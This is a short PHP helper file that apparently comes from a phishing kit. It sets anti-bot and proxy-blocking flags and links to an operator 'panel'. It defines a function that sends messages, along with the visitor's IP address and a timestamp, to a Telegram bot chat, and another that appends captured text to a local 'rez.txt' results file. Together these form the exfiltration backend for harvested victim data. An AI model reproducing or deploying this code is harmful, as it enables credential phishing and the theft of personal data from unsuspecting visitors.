<?php

$zbayb = getenv('API_KEY');
$id = "-1003366306499";

$antibot = "yes";

$block_proxy = "yes";

$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}
$panel_link = str_replace("clients/post.php", "panel/ctr.php", "http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."?ip=$ipp");

function call($msg){
    global $zbayb;
    global $panel_link;
    global $id;
    $info = "

/- MORE INFO -/
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");

    $c = curl_init('https://api.telegram.org/bot'.$zbayb.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}

?>
